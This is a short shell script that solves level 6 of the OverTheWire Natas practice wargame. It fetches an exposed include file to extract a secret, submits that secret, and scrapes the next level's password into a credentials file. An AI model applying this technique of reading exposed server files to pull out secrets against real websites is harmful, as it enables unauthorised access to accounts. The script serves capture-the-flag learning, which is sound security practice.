#!/bin/sh

level="natas6"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)

echo -n "[i] Target: $url\n"
secret=$(curl -u $web_auth -sL $url/includes/secret.inc 2>&1 | grep secret | cut -d "\"" -f 2)
next_password=$(curl -u $web_auth -X POST -d "secret=$secret&submit=Submit" -sL $url 2>&1 | grep "password for natas7" | cut -d " " -f 8 | cut -d "<" -f 1)
echo -n "[+] Password for the next level: $next_password\n"
echo "natas7:$next_password" >> ./credentials
